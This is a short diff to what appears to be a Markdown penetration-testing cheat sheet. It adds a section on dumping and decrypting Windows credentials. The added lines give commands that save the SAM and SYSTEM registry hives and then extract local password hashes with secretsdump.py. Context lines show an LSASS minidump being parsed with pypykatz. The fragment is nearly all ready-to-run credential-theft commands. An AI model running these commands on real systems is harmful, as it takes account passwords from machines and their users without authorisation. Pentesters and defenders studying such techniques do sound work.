@@ -966,8 +966,13 @@ Pars the lsass.dmp
 pypykatz lsa minidump lsass.dmp
 ```
 
-### Decrypt SAM
-secretsdump
+### Dump SAM & Security
+
+```
+reg save hklm\sam c:\sam
+reg save hklm\system c:\system
+```
+Decrypt secretsdump
 ```
 secretsdump.py -sam sam -system system LOCAL
 ```
